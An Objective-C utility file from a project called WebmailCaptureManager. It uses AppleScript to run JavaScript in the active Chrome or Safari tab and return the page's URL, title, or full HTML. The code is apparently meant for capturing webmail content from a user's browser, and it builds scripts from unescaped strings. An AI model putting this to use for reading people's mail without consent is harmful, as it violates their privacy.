//
//  AsJsUtils.m
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/7/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import "AsJsUtils.h"

@implementation AsJsUtils

+ (NSString *) executeJS: (NSString *) aJS app: (NSString *) aAppName {
    return [self executeJS:aJS app:aAppName delay:0.0f];
}

+ (NSString *) executeJS: (NSString *) aJS app: (NSString *) aAppName delay: (float) aDelay {
    NSString *result = nil;
    NSDictionary *error = nil;
    NSString *scptSource = [self getAppleScriptSourceForApp:aAppName javaScript:aJS delay:aDelay];
    NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:scptSource];
    NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
    if (!error) {
        result = [scptResult stringValue];
    } else {
        DLog(@"executeJS error : %@", error);
    }
    [scpt release];
    return result;
}

+ (NSString *) getPageSourceForApp: (NSString *) aAppName {
    NSString *myHTMLSource = nil;
    
    NSString *scptSource = [self getinnerHTMLAppleScriptSourceForApp:aAppName];
    NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:scptSource];
    NSDictionary *error = nil;
    NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
    if (!error) {
        myHTMLSource = [scptResult stringValue];
    } else {
        DLog(@"Get HTML page source error : %@", error);
    }
    [scpt release];
    
    return myHTMLSource;
}

+ (NSString *) getUrlForApp: (NSString *) aAppName {
    NSString *url = nil;
    
    NSString *scptSource = nil;
    if ([aAppName isEqualToString:@"Google Chrome"]) {
        scptSource = @"delay 0.01 \n tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}";
    } else if ([aAppName isEqualToString:@"Safari"]) {
        scptSource = @"delay 0.01 \n tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell";
    }
    NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:scptSource];
    NSDictionary *error = nil;
    NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
    if (!error) {
        url = [[scptResult descriptorAtIndex:1] stringValue];
    } else {
        DLog(@"Get url error : %@", error);
    }
    [scpt release];
    
    return url;
}

+ (NSString *) getinnerHTMLAppleScriptSourceForApp: (NSString *) aAppName {
    return [self getAppleScriptSourceForApp:aAppName javaScript:@"function secretUrl() { var  myVar = document.documentElement.innerHTML; return myVar; } secretUrl();" delay:0.0];
}

+ (NSString *) getAppleScriptSourceForApp: (NSString *) aAppName javaScript: (NSString *) aJavaScript delay: (float) aDelay {
    NSString *scptSource = nil;
    if ([aAppName isEqualToString:@"Google Chrome"]) {
        scptSource = [NSString stringWithFormat:@"tell application \"%@\" \n execute front window's active tab javascript \"%@\" \n return the result \n end tell", aAppName, aJavaScript];
    } else { // Safari
        scptSource = [NSString stringWithFormat:@"tell application \"%@\" \n do JavaScript \"%@\" in document 1 \n return the result \n end tell", aAppName, aJavaScript];
    }
    
    if (aDelay > 0.0) {
        NSString *delay = [NSString stringWithFormat:@"delay %f \n", aDelay];
        scptSource = [delay stringByAppendingString:scptSource];
    }
    
    return scptSource;
}

@end
